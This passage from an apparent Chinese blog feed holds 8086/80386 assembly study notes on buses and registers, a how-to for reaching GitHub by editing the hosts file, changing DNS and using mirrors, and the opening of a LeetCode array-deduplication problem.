<li>每个单元由两部分构成:<ul>
<li>一个是存储单元的地址,一般用十六进制表示</li>
<li>一个是存储单元的内容,一般用十六进制表示</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2021/02/26/T8EseXqMoVFRv6m.png" alt=""></p>
<h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><ul>
<li>一个典型的CPU由运算器、控制器、寄存器等器件组成,这些器件靠内部总线相连</li>
<li>内部总线实现CPU内部各个器件之间的联系</li>
<li>外部总线实现CPU和主板上其它器件的联系</li>
<li>运算器:对数据进行各种算术运算和逻辑运算,即对数据进行加工处理</li>
<li>控制器:完成协调和指挥整个计算机系统的操作</li>
<li>寄存器:暂存指令、数据和地址</li>
</ul>
<h4 id="CPU对存储器读写"><a href="#CPU对存储器读写" class="headerlink" title="CPU对存储器读写"></a>CPU对存储器读写</h4><p><img src="https://i.loli.net/2021/02/26/UXnIRztYfdlSyrG.png" alt=""></p>
<p>CPU对存储器的读写是通过三种总线来完成的,地址总线、数据总线与控制总线,如下图:</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/6hf937BniMrgTqL.png" alt=""></p>
<p>CPU要想进行数据的读写,必须和外部器件(标准的说法是芯片)进行下面3类<br>信息的交互</p>
<ul>
<li>存储单元的地址(地址信息)</li>
<li>器件的选择,读或写的命令(控制信息)</li>
<li>读或写的数据(数据信息)</li>
</ul>
<h4 id="总线宽度与CPU性能"><a href="#总线宽度与CPU性能" class="headerlink" title="总线宽度与CPU性能"></a>总线宽度与CPU性能</h4><ul>
<li>地址总线的宽度决定了CPU的寻址能力</li>
<li>数据总线的宽度决定了CPU与其它器件进行数据传送时的一次数据传送量</li>
<li>控制总线宽度决定了CPU对系统中其它器件的控制能力</li>
</ul>
<h4 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h4><ul>
<li><p>一根导线可以传送的稳定状态只有两种,高电平或是低电平,也就是0或1</p>
</li>
<li><p>一个CPU有N根地址线,则可以说这个CPU的地址总线的宽度为N.这样的CPU最多可以寻找2的N次方个内存单元</p>
</li>
<li><p>示例:<br>8080、8088、8086、80286、80386是16根、20根、20根、24根、32根,则他们的寻址能力分别为6的地址总线宽度分别64KB、1MB、1MB、16MB 、4GB.<br>2\^16B=2^16/ 1024=64KB<br>2\^20B-2^20/ 1024/ 1024=1M<br>2\^24B=2^24/ 1024/ 1024=16M<br>2\^32B=2\^32/1024/1024/1024=4G</p>
</li>
</ul>
<h4 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h4><p>CPU与内存或其他器件之间的数据传送是通过数据总线来进行的.数据总线的宽度决定了CPU和外界的数据传送速度.8根数据总线一次可传送一个 8位二进制数据(即一个字节)16根数据总线一次可传送两个字节.</p>
<ul>
<li>一根数据总线只能传输一个0或1,即1bit</li>
<li>示例:<br>8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根.则它们一次可以传送的数据为:1B、1B、2B、2B、4B</li>
</ul>
<h4 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h4><p>CPU对外部器件的控制是通过控制总线来进行的.在这里控制总线是个总称,控制总线是一些不同控制线的集合.有多少根控制总线,就意味着CPU提供了对外部器件的多少种控制.所以,控制总线的宽度决定了CPU对外部器件的控制能力.</p>
<p>内存读或写命令是由几根控制线综合发出的,其中有一根称为“读信号输出”的控制线负责由CPU向外传送读信号,CPU向该控制线上输出低电平表示将要读取数据;有一根称为“写信号输出”的控制线则负责传送写信号.</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>寄存器是CPU内的组成部分.有限存贮容量的高速存贮部件,它们可用来暂存指令、数据和地址</p>
<ul>
<li>存在于CPU</li>
<li>用于存储数据</li>
<li>速度快</li>
<li>数量有限</li>
<li>8086CPU含有14个寄存器,所有的寄存器都是16位(bit)的,可以存放两个字节,即存放一个字(两个字节等于一个字)</li>
<li>80386CPU含有16个寄存器,所有的寄存器都是32位的,可以存放四个字节,即存放两个字</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227201858133.png" alt=""></p>
<p>在CPU中:</p>
<ul>
<li>运算器进行信息处理</li>
<li>寄存器进行信息存储</li>
<li>控制器控制各种器件进行工作</li>
<li>内部总线连接各种器件,在它们之间进行数据的传送</li>
</ul>
<p>16位CPU所含有的寄存器有(共14个) :</p>
<ul>
<li>4个数据寄存器(AX、BX、CX和DX)</li>
<li>2个变址寄存器(SI和DI) 2个指针寄存器(SP和BP)</li>
<li>4个段寄存器(ES、CS、SS、DS)</li>
<li>1个指令指针寄存器(IP)1个标志寄存器(Flags)</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301085326154.png" alt=""></p>
<p>32位CPU所含有的寄存器有(共16个):</p>
<ul>
<li>4个数据寄存器(EAX、EBX、ECX和EDX)</li>
<li>2个变址和指针寄存器(ESI和EDD)2个指针寄存器(ESP和EBP)</li>
<li>6个段寄存器(ES、CS、SS、DS、<strong>FS</strong>和<strong>GS</strong>)</li>
<li>1个指令指针寄存器(EIP)1个标志寄存器(EFlags)</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227202835381.png" alt=""></p>
<h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><p>数据寄存器主要用来保存操作数和运算结果等信息,从而节省读取操作数所需占用总线和访问存储器的时间</p>
<p>32位CPU有4个32位通用寄存器：EAX、EBX、ECX和EDX,对低16位数据的取存,不会影响高16位的数据,这些低16位寄存器分别命名为AX、BX、CX和DX,它和先前的CPU中的寄存器相一致.4个16位寄存器又可分割成8个独立的8位寄存器(AX:ah-al、BX:bh-bl、CX:ch-cl、DX:dh-dl)</p>
<blockquote>
<p>由于在8086之前的CPU为8位CPU,为了兼容以前的8位程序,在8086CPU中,每一个数据寄存器都可以当做两个单独的寄存器来使用,由此,每一个16位寄存器可以当做2个独立的8位寄存器来使用</p>
</blockquote>
<p>每个寄存器都有自己的名称,可独立存取.程序员可利用数据寄存器的这种”可合可分”的特性,灵活地处理字或字节的信息</p>
<p>AX和al通常称为累加器,用累加器进行的操作可能需要更少时间,累加器可用于乘、除、输入/输出等操作,它们的使用频率很高</p>
<p>BX称为基地址寄存器,它可作为存储器指针来使用</p>
<p>CX称为计数寄存器,在循环和字符串操作时,要用它来控制循环次数;在位操作中,当移多位时,要用cl来指明位移的位数</p>
<p>DX称为数据寄存器,在进行乘、除运算时,它可以为默认的操作数参与运算,也可用于存放I/O的端口地址</p>
<ul>
<li>AX、BX、CX、DX这4个寄存器通常用来存放一般性的数据,被称为通用寄存器</li>
</ul>
<p>注意:除了上面4个数据寄存器以外,其他寄存器均不可以分为两个独立的8位寄存器</p>
<table>
    <tr>
        <th colspan="2">寄存器</th>
        <th>说明</th>
    </tr>
    <tr>
        <td rowspan="2">AX</td>
        <td>AL</td>
        <td rowspan="2">累加寄存器(Accumulator):可用于乘、除、输入/输出等操作
        </td>
    </tr>
    <tr>
        <td>AH</td>
    </tr>
    <tr>
        <td rowspan="2">BX</td>
        <td>BL</td>
        <td rowspan="2">基地址寄存器(Base):可作为存储器指针来使用
        </td>
    </tr>
    <tr>
        <td>BH</td>
    </tr>
    <tr>
        <td rowspan="2">CX</td>
        <td>CL</td>
        <td rowspan="2">计数寄存器(Count):在循环和字符串操作时,要用它来控制循环次数;在位操作中,当移多位时,要用CL来指明移位的位数
        </td>
    </tr>
    <tr>
    <td>CH</td>
    </tr>
    <tr>
    <td rowspan="2">DX</td>
    <td>DL</td>
    <td rowspan="2">数据寄存器(Data):在进行乘、除运算时,它可作为默认的操作数参与运算,也可用于存放I/O的端口地址
    </td>
</tr>
<tr>
    <td>DH</td>
</tr>
</table>

<p>下图表示16位寄存器AX,可以表示成两个8位寄存器,其中AH表示高位的8位寄存器,<br>AL表示低位的8位寄存器</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227205722337.png" alt=""></p>
<p>  <img src="https://gitee.com/wxpgitee/images/raw/master/image-20210227205939995.png" alt=""></p>
<p>注意:</p>
<ul>
<li>在16位CPU中,AX、BX、CX和DX不能存放存储单元的地址</li>
<li>在32位CPU中,其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果,而且也可作为指针寄存器,所以,这些32位寄存器更具有通用性</li>
</ul>
<h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>32位CPU有2个32位通用寄存器ESI和EDI,其低16位对应先前CPU中的SI和DI,对低16位数据的存取,不影响高16位的数据</p>
<p>ESI、EDI、SI和DI称为变址寄存器,它们主要用于存放存储单元在段内的偏移量,用它们可实现多种存储器操作数的寻址方式,为以不同的地址形式访问存储单元提供方便</p>
<p>变址寄存器不可分割成8位寄存器,作为通用寄存器,也可存储算术逻辑运算的操作数和运算结果</p>
<p>它们可作一般的存储器指针使用,在字符串操作指令的执行过程中,对它们有特定的要求,而且还具有特殊的功能</p>
<h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>32位CPU有2个32位通用寄存器EBP和ESP,其低16位对应先前CPU中的BP和SP,对低16位数据的存取,不影响高16位的数据</p>
<p>EBP、ESP、BP和SP称为指针寄存器,主要用于存放堆栈内存储单元的偏移量,用它们可实现多种存储器操作数的寻址方式,为以不同的地址形式访问存储单元提供方便</p>
<p>指针寄存器不可分割成8位寄存器,作为通用寄存器,也可存储算术逻辑运算的操作数和运算结果</p>
<p>它们主要用于访问堆栈内的存储单元,并且规定:</p>
<p>BP为基指针寄存器,用它可直接存取堆栈中的数据</p>
<p>SP为堆栈指针寄存器,用它只可访问栈顶</p>
<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器是根据内存分段的管理模式而设置的.内存单元的物理地址由段寄存器的值和一个偏移量组合而成的,这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址</p>
<p>32位CPU有6个段寄存器,分别如下:</p>
<p>CS：代码段寄存器  ES：附加段寄存器</p>
<p>DS：数据段寄存器  FS：附加段寄存器</p>
<p>SS：堆栈段寄存器  GS：附件段寄存器</p>
<blockquote>
<p>在16位CPU系统中,只有4个段寄存器,所以,程序在任何时刻至多有4个正在使用的段可直接访问,在32位微机系统中,它有6个段寄存器,所以在此环境下开发的程序最多可同时访问6个段</p>
</blockquote>
<p>32位CPU有两个不同的工作方式:实方式和保护方式.在每种方式下,段寄存器的作用是不同的,有关规定简单描述如下:</p>
<ul>
<li><p>实方式:段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致,内存单元的逻辑地址仍为”段地址:偏移地址”的形式,为访问某内存段内的数据,必须使用该段寄存器和存储单元的偏移地址</p>
</li>
<li><p>保护方式:在此方式下,情况要复杂得多,装入段寄存器的不再是段值,而是称为”选择子”的某个值</p>
</li>
</ul>
<p>8086CPU有4个段寄存器:</p>
<ul>
<li>CS:代码段寄存器(Code Segment)</li>
<li>DS:数据段寄存器(Data Segment)</li>
<li>SS:栈段寄存器(Stack Segment)</li>
<li>ES:附加段寄存器(Extra Segment)</li>
</ul>
<p>8086机中,任意时刻,CPU将CS:IP指向的内容作为即将执行的指令</p>
<h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>32位CPU把指令指针扩展到32位,并记作EIP,EIP的低16位与先前CPU中的IP作用相同</p>
<p>指令指针EIP、IP是存放下次将要执行的指令在代码段的偏移地址,在具有预取指令功能的系统中,下次要执行的指令通常已被预取到指令队列中,除非发生转移情况,所以,在理解它们的功能时不考虑存在指令队列的情况</p>
<p>在实方式下,由于每个段的最大范围为64KB,所以,EIP的高16位肯定都为0,此时,相当于只用其低16位的IP来反映程序中的指令的执行次序</p>
<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p>1.运算结果标志位.一共6个,包括:CF进位标志位、PF奇偶标志位、AF辅助进位标志位、ZF零标志位、SF符号标志位、OF溢出标志位</p>
<p>2.状态控制标志位.一共3个,包括:TF追踪标志位、IF中断允许标志位、DF方向标志位</p>
<p>32位标志寄存器增加的4个标志位:</p>
<p> 1.I/O特权标志IOPL</p>
<p>IOPL用两位二进制位来表示,也称为I/O特权级字段,该字段指定了要求执行I/O指令的特权级,如果当前的特权级别在数值上小于等于IOPL的值,那么,该I/O指令可执行,否则将发生一个保护异常</p>
<p>2.嵌套任务标志NT</p>
<p>NT用来控制中断返回指令IRET的执行.具体规定如下:</p>
<p>（1）   当NT=0,用堆栈中保存的值恢复EFlags、CS和EIP,执行常规的中断返回操作</p>
<p>（2）   当NT=1,通过任务转换实现中断返回</p>
<p>3.重启动标志RF</p>
<p>RF用来控制是否接受调试故障.规定:RF=0时,表示接受,否则拒绝</p>
<p>4.虚拟8086方式标志VM</p>
<p>如果VM=1,表示处理机处于虚拟的8086方式下的工作状态,否则,处理机处于一般保护方式下的工作状态</p>
<h3 id="CS-IP"><a href="#CS-IP" class="headerlink" title="CS:IP"></a>CS:IP</h3><h4 id="程序的简要运行流程"><a href="#程序的简要运行流程" class="headerlink" title="程序的简要运行流程"></a>程序的简要运行流程</h4><ol>
<li>程序加载到内存中</li>
<li>CPU找到程序即将执行指令的位置,并执行游戏程序</li>
</ol>
<p>而在这个过程中,需要使用到寄存器(CS:IP)寻址来确定即将执行指令位置</p>
<h4 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h4><p>通常文件中至少有两个段:</p>
<ul>
<li>代码段:存储程序的指令<ul>
<li>一般可读、不可写、可执行</li>
</ul>
</li>
<li>数据段:存储程序中要用到的数据<ul>
<li>一般可读、可写、可执行</li>
</ul>
</li>
</ul>
<p>物理地址=基础地址+偏移地址<br>基础地址=段地址×10H</p>
<p>CPU可以用不同的段地址和偏移地址形成同一个物理地址</p>
<h4 id="修改CS-IP"><a href="#修改CS-IP" class="headerlink" title="修改CS:IP"></a>修改CS:IP</h4><ul>
<li>CPU是由CS:IP中的内容决定执行命令</li>
<li><p>修改:</p>
<ul>
<li><p>同时修改CS:IP的内容</p>
<ul>
<li><p>jmp 段地址:偏移地址</p>
</li>
<li><p>例如: jmp 2AE3:3→从2AE33H处读取指令<br>jmp 3:0B16 →从00B46H处读取指令</p>
</li>
</ul>
</li>
<li>修改IP的内容<ul>
<li>jmp 某一合法寄存器</li>
<li>例如: jmp bx;<ul>
<li>指令执行前: bx=0B16H,CS=2000H,IP=0003H</li>
<li>指令执行后: bx=0B16H,CS=2000H, IP=0B16H</li>
</ul>
</li>
<li>jmp bx;在含义上好似:mov IP,bx</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="字在寄存器的存储"><a href="#字在寄存器的存储" class="headerlink" title="字在寄存器的存储"></a>字在寄存器的存储</h3><p>出于对兼容性的考虑,8086CPU可以一次性处理以下两种尺寸的数据:</p>
<ul>
<li>字节:记为byte,一个字节由8个bit组成,可以存在8位寄存器中</li>
<li>字:记为word,一个字由两个字节组成,这两个字节分别称为这个字的高位字节和低位字节</li>
</ul>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302134231838.png" alt=""></p>
<div class="note info">
            <p>用十六进制来表示数据可以直观地看出这个数据是由哪些8位数据构成的.比如20000写成4E20就可以直观地看出,这个数据是由4E和20两个8位数据构成的,如果AX中存放4E20,则AH里是4E,AL里是20.这种表示方法便于许多问题的直观分析.以后我们多用十六进制来表示一个数据</p>
          </div>
<h3 id="简单汇编指令"><a href="#简单汇编指令" class="headerlink" title="简单汇编指令"></a>简单汇编指令</h3><div class="table-container">
<table>
<thead>
<tr>
<th>汇编指令</th>
<th>控制CPU完成的操作</th>
<th>用高级语言的语法描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>mov ax,18</td>
<td>将18送入寄存器AX</td>
<td>AX=18</td>
</tr>
<tr>
<td>mov ah,78</td>
<td>将78送入寄存器AH</td>
<td>AH=78</td>
</tr>
<tr>
<td>add ax,8</td>
<td>将寄存器AX中的数值加上8</td>
<td>AX=AX+8</td>
</tr>
<tr>
<td>mov ax,bx</td>
<td>将寄存器BX中的数据送入寄存器AX</td>
<td>AX=BX</td>
</tr>
<tr>
<td>add ax,bx</td>
<td>将AX和BX中的数值相加,结果存在AX中</td>
<td>AX=AX+BX</td>
</tr>
</tbody>
</table>
</div>
<p>在汇编源程序中,数据不能以字母开头</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>github无法打开或加载慢的解决方法</title>
    <url>/article/7cc3ca60.html</url>
    <content><![CDATA[<h1 id="github无法打开或加载慢的解决方法"><a href="#github无法打开或加载慢的解决方法" class="headerlink" title="github无法打开或加载慢的解决方法"></a>github无法打开或加载慢的解决方法</h1><a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><em>GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub。<br>作为开源代码库以及版本控制系统，Github拥有超过900万开发者用户。随着越来越多的应用程序转移到了云上，Github已经成为了管理软件开发以及发现已有代码的首选方法。</em><br>最近也想鼓捣鼓捣一下，但却发现一个问题，根本进不去GitHub网站（难道我的念想刚萌芽就要被掐灭吗），没错就是下图<br><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305133853283.png" alt=""><br>这可急坏了我，连忙求助百度，我也是集结多方教程（尝试各路大神的方法），最终解决了这个问题。(注意检查一下自己是不是正在科学上网,这个也会导致访问不了)</p>
<p>在此给出解决方法（亲测有用哟）</p>
<h2 id="一-修改hosts文件"><a href="#一-修改hosts文件" class="headerlink" title="一:修改hosts文件"></a>一:修改hosts文件</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>1.找到hosts文件<br>路径为：<strong>C:\Windows\System32\drivers\etc\hosts</strong><br>2.编辑该文件<br>可以用记事本打开，将下面文本拷贝进去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.30.253.112 github.com</span><br><span class="line">192.30.253.119 gist.github.com</span><br><span class="line">151.101.100.133 assets-cdn.github.com</span><br><span class="line">151.101.100.133 raw.githubusercontent.com</span><br><span class="line">151.101.100.133 gist.githubusercontent.com</span><br><span class="line">151.101.100.133 cloud.githubusercontent.com</span><br><span class="line">151.101.100.133 camo.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars0.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars1.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars2.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars3.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars4.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars5.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars6.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars7.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars8.githubusercontent.com</span><br></pre></td></tr></table></figure>
<p>3.保存（再尝试能不能打开GitHub）</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>1.同样找到hosts文件<br>不过路径变为：<strong>/etc/hosts</strong><br>2.编辑hosts文件<br>同样将下面代码块（和上面一样）拷贝进去并保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.30.253.112 github.com</span><br><span class="line">192.30.253.119 gist.github.com</span><br><span class="line">151.101.100.133 assets-cdn.github.com</span><br><span class="line">151.101.100.133 raw.githubusercontent.com</span><br><span class="line">151.101.100.133 gist.githubusercontent.com</span><br><span class="line">151.101.100.133 cloud.githubusercontent.com</span><br><span class="line">151.101.100.133 camo.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars0.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars1.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars2.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars3.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars4.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars5.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars6.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars7.githubusercontent.com</span><br><span class="line">151.101.100.133 avatars8.githubusercontent.com</span><br></pre></td></tr></table></figure>
<p>3.一般修改时会权限不够，需要获取root权限， 当然临时root权限也是OK的。<br>输入     vim /etc/hosts 进行修改</p>
<h3 id="使用上述内容无法解决问题-自行查询相关IP"><a href="#使用上述内容无法解决问题-自行查询相关IP" class="headerlink" title="使用上述内容无法解决问题,自行查询相关IP"></a>使用上述内容无法解决问题,自行查询相关IP</h3><p>下面演示几个节点的IP查询方法,其他的自行查找</p>
<p>首先确定GitHub的IP<br>打开</p>
<p><a href="https://github.com.ipaddress.com" class="LinkCard">链接</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305134032797.png" alt=""><br>可以看到IP地址为：140.82.114.4（依据个人情况）<br>确定域名的IP:<br>打开<br><a href="https://fastly.net.ipaddress.com/github.global.ssl.fastly.net" class="LinkCard">链接</a><br><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305134153763.png" alt=""><br>IP为192.232.69.194<br>确定静态资源的IP:<br>打开<br><a href="https://github.com.ipaddress.com/assets-cdn.github.com" class="LinkCard">链接</a><br><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305134239499.png" alt=""><br>依据上述方法一或者方法二给出hosts内容逐个查询，编写hosts文件<br>添加如下（依据个人情况编写,下面是我的）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">140.82</span><span class="number">.114</span><span class="number">.4</span> github.com</span><br><span class="line"><span class="number">199.232</span><span class="number">.69</span><span class="number">.194</span> github.global.ssl.fastly.net</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> github.github.io</span><br><span class="line"><span class="number">185.199</span><span class="number">.109</span><span class="number">.153</span> github.github.io</span><br><span class="line"><span class="number">185.199</span><span class="number">.110</span><span class="number">.153</span> github.github.io</span><br><span class="line"><span class="number">185.199</span><span class="number">.111</span><span class="number">.153</span> github.github.io</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars0.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars1.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars2.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars3.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars4.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars5.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars6.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars7.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> avatars8.githubusercontent.com</span><br></pre></td></tr></table></figure>
<h2 id="二-修改DNS解析"><a href="#二-修改DNS解析" class="headerlink" title="二:修改DNS解析"></a>二:修改DNS解析</h2><p>1.鼠标右键点击网络图标</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192211702.png" alt=""></p>
<p>2.点击打开”网络和Internet”设置</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192038638.png" alt=""></p>
<p>3.下拉找到网络和共享中心,点击进入</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192314232.png" alt=""></p>
<p>4.点击红框选中部分</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192434702.png" alt=""></p>
<p>5.点击属性</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192546615.png" alt=""></p>
<p>6.选中Internet协议版本4,点击属性</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192818507.png" alt=""></p>
<p>7.选择使用下面的DNS服务器地址,并输入DNS地址</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305192919627.png" alt=""></p>
<p>8.这里我推荐两个4.2.2.2(微软)和223.5.5.5(阿里),之后点击确定即可</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305193610294.png" alt=""></p>
<h2 id="三-刷新DNS解析缓存"><a href="#三-刷新DNS解析缓存" class="headerlink" title="三:刷新DNS解析缓存"></a>三:刷新DNS解析缓存</h2><p>更改完hosts文件后,建议刷新一下DNS缓存</p>
<p>1.win+R打开运行窗口,输入cmd,点击确定打开cmd窗口</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210305135140751.png" alt=""></p>
<p>2.输入下列命令并回车</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210303193228786.png" alt=""></p>
<h2 id="四-github镜像访问"><a href="#四-github镜像访问" class="headerlink" title="四:github镜像访问"></a>四:github镜像访问</h2><p>这里提供两个github的镜像站,以备不测</p>
<p><a href="https://github.com.cnpmjs.org/" class="LinkCard">https://github.com.cnpmjs.org</a></p>
<p><a href="https://hub.fastgit.org/" class="LinkCard">https://hub.fastgit.org</a></p>
<h2 id="五-新增"><a href="#五-新增" class="headerlink" title="五:新增"></a>五:新增</h2><h3 id="新增一"><a href="#新增一" class="headerlink" title="新增一"></a>新增一</h3><p>1.打开DNS查询工具(这是一个查询域名映射关系的工具)</p>
<p><a href="http://tool.chinaz.com/dns" class="LinkCard">点击前往</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210307164529324.png" alt=""></p>
<p>2.输入github.com,点击检测</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210307164417959.png" alt=""></p>
<p>你也可以检测一下下面的网址(我就检测了一下github官网),然后安照下面的步骤走</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">github.global.ssl.fastly.net</span><br><span class="line">assets-cdn.github.com</span><br></pre></td></tr></table></figure>
<p>3.找到查询结果中TTL值最小的,复制下其ip</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210307164649882.png" alt=""></p>
<p>4.写入hosts文件,保存即可,关于如何写入前面已经提到,就不再赘述</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210307164826147.png" alt="image-20210307164826147"></p>
<h3 id="新增二"><a href="#新增二" class="headerlink" title="新增二"></a>新增二</h3><p>自己查询ip很累吧,我也是在github发现了很多自动查询的项目,小伙伴们可以去看看</p>
<p><a href="https://github.com/521xueweihan/GitHub520" class="LinkCard">Github520</a></p>
<p><a href="https://github.com/12218/python/tree/master/github_ip" class="LinkCard">Python自动查询ip</a></p>
<p><a href="https://github.com/yjacks/GithubHighSpeed" class="LinkCard">GithubHighSpeed</a></p>
<p>具体食用方法不懂的可以问我哦(个人比较推荐第一个)</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>此文仅为记载本人如何解决GitHub无法进入的问题</p>
<p>建议自行查找IP,失效是正常的</p>
]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>初级算法</title>
    <url>/article/cfda4bcb.html</url>
    <content><![CDATA[<h1 id="初级算法"><a href="#初级算法" class="headerlink" title="初级算法"></a>初级算法</h1><a id="more"></a>
<h2 id="删除排序数组中的重复项"><a href="#删除排序数组中的重复项" class="headerlink" title="删除排序数组中的重复项"></a><a href="https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/x2gy9m/">删除排序数组中的重复项</a></h2><p>给你一个有序数组 nums ，请你原地删除重复出现的元素，使每个元素只出现一次，返回删除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。 </p>
<p>说明:</p>
<p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</span><br><span class="line">int len &#x3D; removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在函数里修改输入数组对于调用者是可见的。</span><br><span class="line">&#x2F;&#x2F; 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。</span><br><span class="line">for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2]</span><br><span class="line">输出：2, nums &#x3D; [1,2]</span><br><span class="line">解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
